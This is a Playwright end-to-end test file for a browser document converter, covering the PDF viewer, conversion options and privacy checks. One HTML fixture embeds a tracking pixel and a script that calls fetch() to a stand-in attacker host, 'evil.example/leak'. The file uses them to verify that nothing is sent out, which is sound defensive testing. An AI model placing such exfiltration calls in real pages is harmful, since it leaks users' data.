import { readFileSync } from "node:fs";
import { expect, test, type Page } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";
import { docxXml, extractPdf } from "../unit/helpers";
import { convertAndDownload, fixture, trackNetwork, uploadFile, waitForWorkspace } from "./helpers";

const longMd = (n: number) => Buffer.from(Array.from({ length: n }, (_, i) => `## Section ${i + 1}\n\n${"Lorem ipsum dolor sit amet, consectetur adipiscing elit. ".repeat(14)}\n`).join("\n"));
const md = (name: string, buffer: Buffer) => ({ name, mimeType: "text/markdown", buffer });
const png64 = readFileSync(fixture("opaque.png")).toString("base64");

async function toResult(page: Page, file: Parameters<typeof uploadFile>[1]) {
  await page.goto("/");
  await uploadFile(page, file);
  await waitForWorkspace(page);
  return convertAndDownload(page);
}

const pageLabel = async (page: Page) => (await page.getByTestId("pdf-page-input").inputValue()) + (await page.getByTestId("pdf-page-count").innerText());

test.describe("PDF preview viewer", () => {
  test("shows every page, navigates, zooms, fits, and goes fullscreen", async ({ page }) => {
    await toResult(page, md("long.md", longMd(40)));
    const viewer = page.getByTestId("pdf-viewer");
    await expect(viewer).toBeVisible();
    await expect(viewer.locator("canvas").first()).toBeVisible({ timeout: 20000 });
    const total = Number((await page.getByTestId("pdf-page-count").innerText()).replace(/\D/g, ""));
    expect(total).toBeGreaterThan(5);
    await expect(page.getByTestId("out-meta")).toContainText(`${total} pages`);

    // First page: nothing before it.
    await expect(page.getByTestId("pdf-prev")).toBeDisabled();
    await page.getByTestId("pdf-next").click();
    await expect(page.getByTestId("pdf-page-input")).toHaveValue("2");
    await page.getByTestId("pdf-prev").click();
    await expect(page.getByTestId("pdf-page-input")).toHaveValue("1");

    // Jump by typing a page number; the last page is reachable and Next disables.
    await page.getByTestId("pdf-page-input").fill(String(total));
    await page.getByTestId("pdf-page-input").press("Enter");
    await expect(page.getByTestId("pdf-page-input")).toHaveValue(String(total));
    await expect(page.getByTestId("pdf-next")).toBeDisabled();
    // The target page gets drawn lazily.
    await expect(viewer.locator(`[data-page="${total}"] canvas`)).toBeVisible();
    await expect.poll(async () => viewer.locator(`[data-page="${total}"] canvas`).evaluate((c: HTMLCanvasElement) => c.width), { timeout: 15000 }).toBeGreaterThan(100);

    // Out-of-range input clamps.
    await page.getByTestId("pdf-page-input").fill("9999");
    await page.getByTestId("pdf-page-input").press("Enter");
    await expect(page.getByTestId("pdf-page-input")).toHaveValue(String(total));
    await page.getByTestId("pdf-page-input").fill("1");
    await page.getByTestId("pdf-page-input").press("Enter");
    await expect(page.getByTestId("pdf-page-input")).toHaveValue("1");

    // Zoom.
    const before = parseInt(await page.getByTestId("pdf-zoom-label").innerText(), 10);
    await page.getByTestId("pdf-zoom-in").click();
    const after = parseInt(await page.getByTestId("pdf-zoom-label").innerText(), 10);
    expect(after).toBeGreaterThan(before);
    await page.getByTestId("pdf-zoom-out").click();
    await page.getByTestId("pdf-zoom-out").click();
    expect(parseInt(await page.getByTestId("pdf-zoom-label").innerText(), 10)).toBeLessThan(before);

    // Fit width fills the scroll area; fit page fits the whole page height.
    await page.getByTestId("pdf-fit-width").click();
    await expect(page.getByTestId("pdf-fit-width")).toHaveAttribute("aria-pressed", "true");
    const region = viewer.getByRole("region", { name: /PDF pages/ });
    const rw = (await region.boundingBox())!.width;
    const pw = (await viewer.locator('[data-page="1"]').boundingBox())!.width;
    expect(pw).toBeGreaterThan(rw - 60);
    await page.getByTestId("pdf-fit-page").click();
    await expect(page.getByTestId("pdf-fit-page")).toHaveAttribute("aria-pressed", "true");
    const rh = (await region.boundingBox())!.height;
    const ph = (await viewer.locator('[data-page="1"]').boundingBox())!.height;
    expect(ph).toBeLessThanOrEqual(rh);

    // Fullscreen (real API or the in-page fallback) and back.
    await page.getByTestId("pdf-fullscreen").click();
    await expect(page.getByTestId("pdf-fullscreen")).toHaveAttribute("aria-pressed", "true");
    await page.getByTestId("pdf-fullscreen").click();
    await expect(page.getByTestId("pdf-fullscreen")).toHaveAttribute("aria-pressed", "false");
  });

  test("keeps memory bounded: pages far from the viewport release their canvas", async ({ page }) => {
    await toResult(page, md("long.md", longMd(60)));
    const viewer = page.getByTestId("pdf-viewer");
    await expect(viewer.locator("canvas").first()).toBeVisible({ timeout: 20000 });
    await expect.poll(() => viewer.locator("canvas").evaluateAll((cs) => (cs as HTMLCanvasElement[]).filter((c) => c.width > 0).length), { timeout: 15000 }).toBeGreaterThan(0);
    const drawn = await viewer.locator("canvas").evaluateAll((cs) => (cs as HTMLCanvasElement[]).filter((c) => c.width > 0).length);
    const total = await viewer.locator("canvas").count();
    expect(total).toBeGreaterThan(10);
    expect(drawn).toBeLessThanOrEqual(10);
  });

  test("shows an error state, not a blank panel, when the viewer engine can't load; download still works", async ({ page }) => {
    await page.route("**/vendor/pdf.worker.min.mjs", (r) => r.abort());
    const { bytes } = await toResult(page, md("n.md", Buffer.from("# Hello\n\ntext")));
    await expect(page.getByTestId("pdf-error")).toContainText("couldn't be shown", { timeout: 20000 });
    expect(bytes.subarray(0, 5).toString()).toBe("%PDF-");
  });

  test("viewer is keyboard reachable, labeled, and passes axe", async ({ page }) => {
    await toResult(page, md("n.md", longMd(10)));
    await expect(page.getByTestId("pdf-viewer").locator("canvas").first()).toBeVisible({ timeout: 20000 });
    await page.waitForTimeout(600);
    const res = await new AxeBuilder({ page }).withTags(["wcag2a", "wcag2aa", "wcag21aa"]).analyze();
    expect(res.violations.map((v) => `${v.id} ${v.nodes.map((n) => n.target.join(" ")).join("|")}`)).toEqual([]);
    await page.getByTestId("pdf-next").focus();
    await expect(page.getByTestId("pdf-next")).toBeFocused();
    await page.keyboard.press("Tab");
    await expect(page.getByTestId("pdf-zoom-out")).toBeFocused();
  });

  test("result page has no horizontal overflow with the viewer", async ({ page }) => {
    await toResult(page, md("n.md", longMd(8)));
    await expect(page.getByTestId("pdf-viewer").locator("canvas").first()).toBeVisible({ timeout: 20000 });
    expect(await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth)).toBeLessThanOrEqual(0);
  });

  test("DOCX results get a clearly labeled approximate preview", async ({ page }) => {
    await page.goto("/");
    await uploadFile(page, fixture("sample.md"));
    await waitForWorkspace(page);
    await page.getByTestId("output-docx").click();
    await convertAndDownload(page);
    await expect(page.getByTestId("docx-preview-note")).toContainText("Approximate preview");
    await expect(page.getByTestId("doc-preview")).toContainText("Project Plan");
    await expect(page.getByTestId("pdf-viewer")).toHaveCount(0);
  });
});

test.describe("advanced options", () => {
  test("only relevant options appear for each source type", async ({ page }) => {
    await page.goto("/");
    await uploadFile(page, fixture("sample.csv"));
    await waitForWorkspace(page);
    const adv = page.getByTestId("advanced-options");
    await adv.locator("summary").click();
    await expect(adv.getByLabel("Delimiter")).toBeVisible();
    await expect(adv.getByText("Tables", { exact: true })).toBeVisible();
    await expect(adv.getByText("Markdown output")).toHaveCount(0);

    await page.getByRole("button", { name: "New File" }).click();
    await uploadFile(page, fixture("sample.txt"));
    await waitForWorkspace(page);
    await page.getByTestId("advanced-options").locator("summary").click();
    await expect(page.getByTestId("advanced-options").getByLabel("Delimiter")).toHaveCount(0);
    await expect(page.getByTestId("advanced-options").getByText("Tables", { exact: true })).toHaveCount(0);

    await page.getByRole("button", { name: "New File" }).click();
    await uploadFile(page, fixture("sample.md"));
    await waitForWorkspace(page);
    await page.getByTestId("advanced-options").locator("summary").click();
    await expect(page.getByTestId("advanced-options").getByText("Markdown output")).toBeVisible();

    await page.getByRole("button", { name: "New File" }).click();
    await uploadFile(page, fixture("image.png"));
    await waitForWorkspace(page);
    await expect(page.getByTestId("advanced-options")).toHaveCount(0);
  });

  test("CSV delimiter and header overrides re-parse instantly and change the output", async ({ page }) => {
    await page.goto("/");
    await uploadFile(page, { name: "semi.csv", mimeType: "text/csv", buffer: Buffer.from("name;qty\nApple;3\nPear;5\n") });
    await waitForWorkspace(page);
    await expect(page.locator('[data-testid="notices"]:visible')).toContainText("Detected semicolon");
    await page.getByTestId("advanced-options").locator("summary").click();
    await page.getByLabel("Delimiter").selectOption(",");
    await expect(page.locator('[data-testid="notices"]:visible')).toContainText("Using comma");
    await expect(page.getByTestId("doc-preview").locator("th")).toHaveCount(1);
    await page.getByLabel("Delimiter").selectOption("auto");
    await expect(page.getByTestId("doc-preview").locator("th")).toHaveCount(2);
    await page.getByRole("radio", { name: "Is data" }).click();
    await expect(page.getByTestId("doc-preview").locator("th")).toHaveCount(0);
    await expect(page.getByTestId("doc-preview").locator("tr")).toHaveCount(3);
    const { bytes } = await convertAndDownload(page);
    const text = (await extractPdf(new Uint8Array(bytes))).pages.join(" ");
    expect(text).toContain("name");
    expect(text).toContain("Pear");
  });

  test("font, header, footer and page numbers reach the PDF; the same options reach the DOCX", async ({ page }) => {
    await page.goto("/");
    await uploadFile(page, fixture("sample.md"));
    await waitForWorkspace(page);
    await page.getByTestId("advanced-options").locator("summary").click();
    await page.getByRole("radio", { name: "Serif" }).click();
    await page.getByLabel("Header text").fill("Team plan");
    await page.getByLabel("Footer text").fill("Internal");
    await page.getByLabel("Page numbers").selectOption("page-n-of-N");
    const { bytes } = await convertAndDownload(page);
    expect(bytes.toString("latin1")).toMatch(/LiberationSerif/);
    const text = (await extractPdf(new Uint8Array(bytes))).pages.join(" ");
    expect(text).toContain("Team plan");
    expect(text).toContain("Internal");
    expect(text).toMatch(/Page 1 of \d+/);

    await page.getByRole("button", { name: "Change settings and convert again" }).click();
    await page.getByTestId("output-docx").click();
    await page.getByTestId("advanced-options").locator("summary").click();
    await expect(page.getByLabel("Header text")).toHaveValue("Team plan");
    const { bytes: docx } = await convertAndDownload(page);
    const { zip } = await docxXml(new Uint8Array(docx));
    const header = await zip.file(Object.keys(zip.files).find((n) => /word\/header\d*\.xml/.test(n))!)!.async("string");
    expect(header).toContain("Team plan");
    const styles = await zip.file("word/styles.xml")!.async("string");
    expect(styles).toContain("Times New Roman");
  });

  test("document style defaults persist across reloads and apply to new files", async ({ page }) => {
    await page.goto("/settings/");
    await page.getByRole("radio", { name: "Serif" }).first().click();
    await page.getByLabel("Page numbers").selectOption("n");
    await page.reload();
    await expect(page.getByRole("radio", { name: "Serif" }).first()).toHaveAttribute("aria-checked", "true");
    await page.goto("/");
    await uploadFile(page, fixture("sample.txt"));
    await waitForWorkspace(page);
    const { bytes } = await convertAndDownload(page);
    expect(bytes.toString("latin1")).toMatch(/LiberationSerif/);
    // Reset so later tests start from defaults.
    await page.goto("/settings/");
    await page.getByTestId("clear-settings").click();
  });

  test("Markdown source mode keeps the markup", async ({ page }) => {
    await page.goto("/");
    await uploadFile(page, md("n.md", Buffer.from("# Title\n\n**bold** text\n")));
    await waitForWorkspace(page);
    await page.getByTestId("advanced-options").locator("summary").click();
    await page.getByRole("radio", { name: "Source text" }).click();
    const { bytes } = await convertAndDownload(page);
    const text = (await extractPdf(new Uint8Array(bytes))).pages.join(" ").replace(/\s+/g, " ");
    expect(text).toContain("**bold**");
    expect(text).toContain("# Title");
  });
});

test.describe("HTML fidelity in the browser", () => {
  const html = `<html><head><title>Styled</title></head><body>
    <h1 style="text-align:center;color:#1e3a8a">Styled Title</h1>
    <p>Normal <u>underlined</u> <span style="color:#c00000">red</span></p>
    <img alt="logo" src="data:image/png;base64,${png64}">
    <div style="page-break-before:always"></div><p>Second page text</p>
    <img alt="remote" src="https://evil.example/pixel.png">
    <script>fetch("https://evil.example/leak")</script>
    </body></html>`;

  test("styles, embedded image and page break reach the PDF and DOCX; remote content is never requested", async ({ page }) => {
    const net = trackNetwork(page);
    await page.goto("/");
    await uploadFile(page, { name: "styled.html", mimeType: "text/html", buffer: Buffer.from(html) });
    await waitForWorkspace(page);
    await expect(page.locator('[data-testid="notices"]:visible')).toContainText("1 embedded image included");
    await expect(page.locator('[data-testid="notices"]:visible')).toContainText("linked image was not loaded");
    await expect(page.getByTestId("doc-preview").locator("img")).toHaveCount(1);
    await expect(page.getByTestId("doc-preview").getByRole("separator", { name: "Page break" })).toBeVisible();
    const { bytes } = await convertAndDownload(page);
    const { pages, numPages } = await extractPdf(new Uint8Array(bytes));
    expect(numPages).toBe(2);
    expect(pages[0]).toContain("Styled Title");
    expect(pages[1]).toContain("Second page text");
    expect(bytes.toString("latin1")).toMatch(/\/Subtype\s*\/Image/);
    // The viewer must draw the page that holds the image (regression: an unsupported-API crash left a blank page).
    const viewer = page.getByTestId("pdf-viewer");
    await expect(viewer.locator('[data-page="1"] canvas')).toBeVisible();
    await expect.poll(() => viewer.locator('[data-page="1"] canvas').evaluate((c: HTMLCanvasElement) => c.width), { timeout: 15000 }).toBeGreaterThan(100);
    await page.waitForTimeout(800);
    await expect(viewer).not.toContainText("couldn't be drawn");
    const dark = await viewer.locator('[data-page="1"] canvas').evaluate((c: HTMLCanvasElement) => {
      const ctx = c.getContext("2d")!;
      const d = ctx.getImageData(0, 0, c.width, c.height).data;
      let n = 0;
      for (let i = 0; i < d.length; i += 4) if (d[i]! < 100 && d[i + 2]! > 150) n++; // the blue square from the embedded image
      return n;
    });
    expect(dark, "embedded image pixels are visible in the preview").toBeGreaterThan(500);
    await page.getByRole("button", { name: "Change settings and convert again" }).click();
    await page.getByTestId("output-docx").click();
    const { bytes: docx } = await convertAndDownload(page);
    const { xml, zip } = await docxXml(new Uint8Array(docx));
    expect(Object.keys(zip.files).filter((n) => n.startsWith("word/media/") && !zip.files[n]!.dir)).toHaveLength(1);
    expect(xml).toContain('w:val="C00000"');
    expect(xml).toContain("<w:u ");
    expect(net.external).toEqual([]);
    expect(net.all.some((u) => /evil\.example/.test(u))).toBe(false);
  });
});

test("no file content leaves the browser while the preview viewer renders", async ({ page }) => {
  const net = trackNetwork(page);
  const bodies: string[] = [];
  page.on("request", (r) => r.postData() && bodies.push(r.postData()!));
  await toResult(page, md("secret.md", Buffer.from("# Secret plan\n\nTop secret body text.")));
  await expect(page.getByTestId("pdf-viewer").locator("canvas").first()).toBeVisible({ timeout: 20000 });
  expect(net.external).toEqual([]);
  expect(net.writes).toEqual([]);
  expect(bodies).toEqual([]);
  // The only extra same-origin requests are the viewer's own static assets.
  const own = net.all.filter((u) => u.includes("/vendor/") || u.includes("/fonts/"));
  expect(own.every((u) => u.startsWith("http://localhost:3100/"))).toBe(true);
});
